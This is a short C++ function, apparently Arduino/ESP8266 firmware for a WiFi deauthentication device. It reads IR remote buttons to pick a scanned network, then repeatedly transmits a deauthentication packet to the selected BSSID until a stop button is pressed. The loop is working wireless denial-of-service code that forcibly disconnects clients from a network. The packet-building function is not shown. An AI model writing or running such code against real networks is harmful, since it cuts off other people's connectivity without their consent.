void controls(){
  if (irrecv.decode(&results)) {
    if(results.value == 16754775){
      if(pointer > 4 && shift <= SSID_counter - 8){
        shift++;
      }else{
        if(pointer < 5){
          pointer++;
        }
      }
    }
    if(results.value == 16736925){
      if(pointer < 1 && shift > 0){
        shift--;
      }else{
        if(pointer > 0){
          pointer--;
        }
      }
    }
    if(results.value == 16753245){
      id = shift + pointer;
      isSelected = true;
      createPacket(WiFi.BSSID(id));
      wifi_set_channel(WiFi.channel(id));
      while(isSelected){
        wifi_send_pkt_freedom(deauthPacket, 26, 0);
        irrecv.resume();
        for(int i = 0; i < 200; i++){
          if (irrecv.decode(&results)) {
            if(results.value == 16769565){
              isSelected = false;
            }
          }
          delay(1);
        }
      }
    }
    irrecv.resume();
  }
}